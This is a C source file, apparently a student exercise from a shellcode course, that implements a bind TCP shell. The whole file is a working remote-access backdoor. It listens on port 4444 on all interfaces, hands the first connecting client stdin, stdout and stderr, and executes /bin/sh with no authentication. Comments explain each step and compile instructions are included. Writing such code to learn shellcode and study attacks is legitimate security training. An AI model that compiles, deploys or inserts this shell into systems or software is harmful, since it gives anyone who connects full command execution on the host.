#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
/**
 * Bind TCP Shell
 * Student Id: SLAE-755
 * Thanks to:
 *  - https://www.adampalmer.me/iodigitalsec/2013/04/07/linux-shell-bind-tcp-shellcode/
 *  - https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/
 *  - https://www.programminglogic.com/example-of-client-server-program-in-c-using-sockets-and-tcp/
 * 
 * Compile: gcc shell_bind_tcp.c -o shell_bind_tcp
*/
int main(void)
{
        int client_sock, sockfd;
        int port = 4444;
        struct sockaddr_in mysockaddr;
  
	/*---- Create the socket. The three arguments are: ----*/
  	/* 1) Internet domain 2) Stream socket 3) Default protocol (TCP in this case) */
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
         

	/*---- Configure settings of the server address struct ----*/
  	/* Address family = Internet */
        mysockaddr.sin_family = AF_INET; //2
	/* Set port number, using htons function to use proper byte order */
        mysockaddr.sin_port = htons(port);
	/* Set IP address to any */
        mysockaddr.sin_addr.s_addr = INADDR_ANY; //0
  
	/*---- Bind the address struct to the socket ----*/
        bind(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
 

        /*----  Listen for incoming connections ----*/
        listen(sockfd, 0);
  
	/*---- Accept call creates a new socket for the incoming connection ----*/
        client_sock = accept(sockfd, NULL, NULL);
  
       	/*---- Redirect STDIN, STDOUT and STDERR to client_sock ----*/
        dup2(client_sock, 0);
        dup2(client_sock, 1);
        dup2(client_sock, 2);
  
        execve("/bin/sh", NULL, NULL);
        return 0;
}
